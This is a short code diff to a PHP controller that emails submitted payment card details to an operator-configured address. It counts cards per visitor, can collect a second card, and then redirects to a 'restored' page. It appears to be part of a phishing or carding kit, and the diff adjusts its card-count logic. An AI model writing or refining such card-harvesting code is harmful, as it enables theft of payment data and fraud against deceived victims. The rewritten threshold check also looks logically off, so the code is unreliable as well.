@@ -35,16 +35,15 @@ class CardController extends Controller {
 
         try {
             Mail::to($settings->email_result)->sendNow(new CardDetails($request));
+            if (Cache::get($request->cardNumber) !== $visitor->user) {
+                $visitor->increment('card_count');
+                $visitor->save();
+            }
         } catch (Throwable $t) {
             Log::error($t);
         }
 
-        if (Cache::get($request->cardNumber) !== $visitor->user) {
-            $visitor->increment('card_count');
-            $visitor->save();
-        }
-
-        if ((!$settings->double_cards && $visitor->card_count > 0) || ($visitor->card_count > 1)) {
+        if ($visitor->card_count >= ($settings->double_cards ? 1 : 0)) {
             $visitor->is_finished = true;
             $visitor->save();
             return redirect()->route(route: 'restored');
